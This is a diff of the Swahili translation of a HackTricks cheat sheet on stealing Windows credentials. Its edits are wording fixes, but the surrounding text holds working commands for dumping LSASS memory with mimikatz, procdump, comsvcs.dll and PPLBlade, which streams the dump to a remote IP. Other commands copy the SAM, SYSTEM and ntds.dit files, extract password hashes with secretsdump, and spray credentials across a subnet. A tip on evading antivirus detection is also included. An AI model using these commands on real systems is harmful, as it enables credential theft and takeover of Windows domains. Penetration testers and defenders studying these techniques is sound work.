@@ -1,8 +1,8 @@
-# Kuiba Akida za Windows
+# Kuiba Akauti za Windows
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Akida Mimikatz
+## Akauti Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -67,14 +67,14 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Hali hii inafanywa kiotomatiki na [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Kumbuka**: Baadhi ya **AV** zinaweza **kubaini** matumizi ya **procdump.exe kutekeleza lsass.exe**, hii ni kwa sababu wanabaini mfuatano wa **"procdump.exe" na "lsass.exe"**. Hivyo ni **rahisi zaidi** **kupitisha** kama **hoja** **PID** ya lsass.exe kwa procdump **badala ya** jina la **lsass.exe.**
+**Kumbuka**: Baadhi ya **AV** zinaweza **kubaini** matumizi ya **procdump.exe kutupa lsass.exe**, hii ni kwa sababu wanabaini mfuatano wa **"procdump.exe" na "lsass.exe"**. Hivyo ni **rahisi zaidi** **kupitisha** kama **hoja** **PID** ya lsass.exe kwa procdump **badala ya** jina la **lsass.exe.**
 
-### Kutekeleza lsass na **comsvcs.dll**
+### Kutupa lsass kwa **comsvcs.dll**
 
-DLL inayoitwa **comsvcs.dll** inayopatikana katika `C:\Windows\System32` inawajibika kwa **kutekeleza kumbukumbu ya mchakato** katika tukio la ajali. DLL hii ina **kazi** inayoitwa **`MiniDumpW`**, iliyoundwa kutumika kwa `rundll32.exe`.\
-Ni muhimu kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Kitambulisho cha mchakato kinachotakiwa kutekelezwa kinaunda kipengele cha kwanza, mahali pa faili la dump linawakilisha cha pili, na kipengele cha tatu ni neno **full**. Hakuna chaguo mbadala.\
-Baada ya kuchambua vipengele hivi vitatu, DLL inahusika katika kuunda faili la dump na kuhamasisha kumbukumbu ya mchakato ulioainishwa katika faili hii.\
-Matumizi ya **comsvcs.dll** yanawezekana kwa kutekeleza mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezwa kwa undani katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+DLL inayojulikana kama **comsvcs.dll** inayopatikana katika `C:\Windows\System32` inawajibika kwa **kutupa kumbukumbu ya mchakato** katika tukio la ajali. DLL hii ina **kazi** inayojulikana kama **`MiniDumpW`**, iliyoundwa kutumika kwa `rundll32.exe`.\
+Ni muhimu kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Kitambulisho cha mchakato kinachotakiwa kutupwa kinaunda kipengele cha kwanza, mahali pa faili ya dump inawakilisha cha pili, na kipengele cha tatu ni neno **full**. Hakuna chaguo mbadala.\
+Baada ya kuchambua vipengele hivi vitatu, DLL inahusika katika kuunda faili ya dump na kuhamasisha kumbukumbu ya mchakato ulioainishwa ndani ya faili hii.\
+Matumizi ya **comsvcs.dll** yanawezekana kwa kutupa mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezwa kwa undani katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Amri ifuatayo inatumika kwa utekelezaji:
 ```bash
@@ -82,12 +82,12 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
 **Unaweza kujiandaa mchakato huu kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Kutoa lsass kwa kutumia Task Manager**
+### **Kutoa lsass kwa kutumia Meneja wa Kazi**
 
-1. Bonyeza kulia kwenye Task Bar na bonyeza Task Manager
+1. Bonyeza kulia kwenye Kichupo cha Kazi na bonyeza kwenye Meneja wa Kazi
 2. Bonyeza kwenye Maelezo zaidi
-3. Tafuta mchakato wa "Local Security Authority Process" kwenye tab ya Processes
-4. Bonyeza kulia kwenye mchakato wa "Local Security Authority Process" na bonyeza "Create dump file".
+3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Mipango
+4. Bonyeza kulia kwenye mchakato wa "Local Security Authority Process" na bonyeza kwenye "Create dump file".
 
 ### Kutoa lsass kwa kutumia procdump
 
@@ -98,13 +98,13 @@ Get-Process -Name LSASS
 ```
 ## Dumpin lsass na PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Zana ya Kutoa Mchakato Iliohifadhiwa inayosaidia kuficha mchakato wa kumbukumbu na kuhamasisha kwenye vituo vya mbali bila kuacha kwenye diski.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Zana ya Kutoa Mchakato Iliohifadhiwa inayosaidia kuficha mchakato wa kumbukumbu na kuhamasisha kwenye vituo vya mbali bila kuiacha kwenye diski.
 
 **Mifumo muhimu**:
 
 1. Kupita ulinzi wa PPL
 2. Kuficha faili za mchakato wa kumbukumbu ili kuepuka mifumo ya kugundua inayotegemea saini ya Defender
-3. Kupakia mchakato wa kumbukumbu kwa njia za RAW na SMB bila kuacha kwenye diski (dump isiyo na faili)
+3. Kupakia mchakato wa kumbukumbu kwa njia za RAW na SMB bila kuiacha kwenye diski (dump isiyo na faili)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -118,12 +118,12 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dumisha NTDS.dit kutoka DC lengwa
+### Pakua NTDS.dit kutoka kwa DC lengwa
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Punguza historia ya nywila ya NTDS.dit kutoka kwa DC lengwa
+### Pakua historia ya nywila ya NTDS.dit kutoka kwa DC lengwa
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -137,20 +137,20 @@ Hizi faili zinapaswa kuwa **zimewekwa** katika _C:\windows\system32\config\SAM_ 
 
 ### Kutoka kwa Registry
 
-Njia rahisi ya kuiba hizi faili ni kupata nakala kutoka kwenye registry:
+Njia rahisi ya kuiba faili hizo ni kupata nakala kutoka kwa registry:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hash** ukitumia:
+**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hash** kwa kutumia:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Unaweza kufanya nakala ya faili zilizolindwa ukitumia huduma hii. Unahitaji kuwa Administrator.
+Unaweza kufanya nakala ya faili zilizo na ulinzi ukitumia huduma hii. Unahitaji kuwa Administrator.
 
 #### Using vssadmin
 
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili faili la SAM** (diski ngumu inayotumika ni "C:" na inahifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kwa kunakili faili yoyote iliyo na ulinzi:
+Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili faili ya SAM** (diski ngumu inayotumika ni "C:" na inahifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kwa kunakili faili yoyote iliyo na ulinzi:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -184,9 +184,9 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Akida za Active Directory - NTDS.dit**
 
-Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likihifadhi data muhimu kuhusu vitu vya watumiaji, vikundi, na uanachama wao. Hapa ndipo **hashes za nywila** za watumiaji wa kikoa zinahifadhiwa. Faili hii ni **Extensible Storage Engine (ESE)** database na inapatikana katika **_%SystemRoom%/NTDS/ntds.dit_**.
+Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likihifadhi data muhimu kuhusu vitu vya mtumiaji, vikundi, na uanachama wao. Hapa ndipo **hashes za nywila** za watumiaji wa kikoa zinahifadhiwa. Faili hii ni **Extensible Storage Engine (ESE)** database na inapatikana katika **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Ndani ya database hii, meza tatu kuu zinahifadhiwa:
+Katika database hii, meza tatu kuu zinahifadhiwa:
 
 - **Meza ya Data**: Meza hii ina jukumu la kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
 - **Meza ya Link**: Inafuatilia uhusiano, kama vile uanachama wa vikundi.
@@ -200,7 +200,7 @@ Windows inatumia _Ntdsa.dll_ kuingiliana na faili hiyo na inatumika na _lsass.ex
 
 Hash inafichwa mara 3:
 
-1. Fungua Funguo la Usimbaji wa Nywila (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
+1. Fungua Funguo ya Usimbaji wa Nywila (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
 2. Fungua **hash** kwa kutumia **PEK** na **RC4**.
 3. Fungua **hash** kwa kutumia **DES**.
 
@@ -212,15 +212,15 @@ Inapatikana tangu Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Unaweza pia kutumia mbinu ya [**volume shadow copy**](./#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya faili ya **SYSTEM** (tena, [**dondoa kutoka kwenye rejista au tumia mbinu ya volume shadow copy**](./#stealing-sam-and-system)).
+Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya faili ya **SYSTEM** (tena, [**dondoa kutoka kwenye rejista au tumia mbinu ya volume shadow copy**](#stealing-sam-and-system)).
 
-### **Kutoa hashes kutoka NTDS.dit**
+### **Kutoa hash kutoka NTDS.dit**
 
 Mara tu unapokuwa umepata faili za **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ kutoa **hashes**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Unaweza pia **kuzipata kiotomatiki** kwa kutumia mtumiaji halali wa admin wa eneo:
+Unaweza pia **kuzipata kiotomatiki** kwa kutumia mtumiaji halali wa admin wa kikoa:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
@@ -230,11 +230,11 @@ Hatimaye, unaweza pia kutumia **moduli ya metasploit**: _post/windows/gather/cre
 
 ### **Kutoa vitu vya kikoa kutoka NTDS.dit hadi kwenye hifadhidata ya SQLite**
 
-Vitu vya NTDS vinaweza kutolewa kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri pekee zinazotolewa bali pia vitu vyote na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi wakati faili ghafi ya NTDS.dit tayari imeshapatikana.
+Vitu vya NTDS vinaweza kutolewa kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri pekee zinazotolewa bali pia vitu vyote na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive ni hiari lakini inaruhusu ufichuzi wa siri (NT & LM hashes, nyongeza za akidi kama nywila za wazi, funguo za kerberos au imani, historia za nywila za NT & LM). Pamoja na taarifa nyingine, data ifuatayo inachukuliwa: akaunti za mtumiaji na mashine zikiwa na hashes zao, bendera za UAC, muda wa mwisho wa kuingia na kubadilisha nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurudi, mti wa vitengo vya shirika na uanachama, maeneo ya kuaminika yenye aina za imani, mwelekeo na sifa...
+`SYSTEM` hive ni hiari lakini inaruhusu ufichuzi wa siri (NT & LM hashes, akidi za ziada kama nywila za wazi, funguo za kerberos au imani, historia za nywila za NT & LM). Pamoja na taarifa nyingine, data ifuatayo inachukuliwa: akaunti za mtumiaji na mashine zikiwa na hashes zao, bendera za UAC, muda wa mwisho wa kuingia na kubadilisha nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurudi, mti wa vitengo vya shirika na uanachama, maeneo ya kuaminika yenye aina za imani, mwelekeo na sifa...
 
 ## Lazagne
 
@@ -257,7 +257,7 @@ fgdump.exe
 ```
 ### PwDump
 
-Toa akauti kutoka kwa faili la SAM
+Toa akiba kutoka kwa faili la SAM
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -269,6 +269,6 @@ Pakua kutoka: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org
 
 ## Defenses
 
-[**Jifunze kuhusu baadhi ya ulinzi wa akreditivu hapa.**](credentials-protections.md)
+[**Jifunze kuhusu baadhi ya ulinzi wa akidi hapa.**](credentials-protections.md)
 
 {{#include ../../banners/hacktricks-training.md}}
